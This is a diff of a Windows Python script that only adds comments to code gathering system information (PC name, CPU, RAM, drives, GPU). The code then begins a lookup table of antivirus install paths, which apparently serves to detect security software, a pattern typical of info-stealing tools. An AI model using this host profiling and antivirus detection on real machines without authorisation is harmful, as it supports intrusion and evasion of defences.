@@ -18,6 +18,10 @@ import win32api
 import time
 import requests
 from win32com.client import GetObject
+"""
+logo
+"""
+
 logo = '''
 |-----------------------------------------------------------------------------|
 |       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       |
@@ -43,18 +47,18 @@ def SystemInfo():
 
         uname = platform.uname()
 
-        namepc = "\nPc name: " + str(uname.node)
-        countofcpu = psutil.cpu_count(logical=True)
-        allcpucount = "\nnumber of CPU cores:" + str(countofcpu) 
+        namepc = "\nPc name: " + str(uname.node)# get ps name
+        countofcpu = psutil.cpu_count(logical=True)# get cpu
+        allcpucount = "\nnumber of CPU cores:" + str(countofcpu) # get number of CPU cores
 
         cpufreq = psutil.cpu_freq()
-        cpufreqincy = "\nCPU frequency: " + str(cpufreq.max) + 'Mhz'
+        cpufreqincy = "\nCPU frequency: " + str(cpufreq.max) + 'Mhz'# get CPU frequency
 
 
         svmem = psutil.virtual_memory()
-        allram = "\nTotal RAM: " + str(get_size(svmem.total))
-        ramfree = "\nAvailable: " + str(get_size(svmem.available))
-        ramuseg = "\nUsed: " + str(get_size(svmem.used))
+        allram = "\nTotal RAM: " + str(get_size(svmem.total))# get Total RAM
+        ramfree = "\nAvailable: " + str(get_size(svmem.available))# get Available RAM
+        ramuseg = "\nUsed: " + str(get_size(svmem.used))# get Used RAM
 
 
 
@@ -64,17 +68,17 @@ def SystemInfo():
 
         partitions = psutil.disk_partitions()
         for partition in partitions:
-            nameofdevice = "\nDrive: " + str(partition.device)
-            nameofdick = "\nDrive volume: " + str(partition.mountpoint)
-            typeoffilesystem = "\nFile system type: " + str(partition.fstype)
+            nameofdevice = "\nDrive: " + str(partition.device)# get Drives
+            nameofdick = "\nDrive volume: " + str(partition.mountpoint)# get Drive volume
+            typeoffilesystem = "\nFile system type: " + str(partition.fstype)# File system type
             try:
                 partition_usage = psutil.disk_usage(partition.mountpoint)
             except PermissionError:
 
                 continue
-            allstorage = "\nTotal memory: " + str(get_size(partition_usage.total))
-            usedstorage = "\nUsed: " + str(get_size(partition_usage.used))
-            freestorage = "\nAvailable: " + str(get_size(partition_usage.free))
+            allstorage = "\nTotal memory: " + str(get_size(partition_usage.total))# get Total memory
+            usedstorage = "\nUsed: " + str(get_size(partition_usage.used))# get Used
+            freestorage = "\nAvailable: " + str(get_size(partition_usage.free))# get Total Available
 
 
 
@@ -83,17 +87,19 @@ def SystemInfo():
             list_gpus = []
             for gpu in gpus:
 
-                gpu_name = "\nType of GPU: " + gpu.name
+                gpu_name = "\nType of GPU: " + gpu.name# get Type of GPU
 
-                gpu_free_memory = "\nAvailable GPU memory: " + f"{gpu.memoryFree}MB"
+                gpu_free_memory = "\nAvailable GPU memory: " + f"{gpu.memoryFree}MB"# get Available GPU memory
 
-                gpu_total_memory = "\nTotal GPU memory: " f"{gpu.memoryTotal}MB"
+                gpu_total_memory = "\nTotal GPU memory: " f"{gpu.memoryTotal}MB"# get Total GPU memory
 
-                gpu_temperature = "\nGPU temperature: " f"{gpu.temperature} °C"
+                gpu_temperature = "\nGPU temperature: " f"{gpu.temperature} °C"# get GPU temperature
         except:
             print('No GPU')
 
-
+        """
+        all needed paths
+        """
         Antiviruses = {
             'C:\\Program Files\\Windows Defender': 'Windows Defender',
             'C:\\Program Files\\AVAST Software\\Avast': 'Avast',
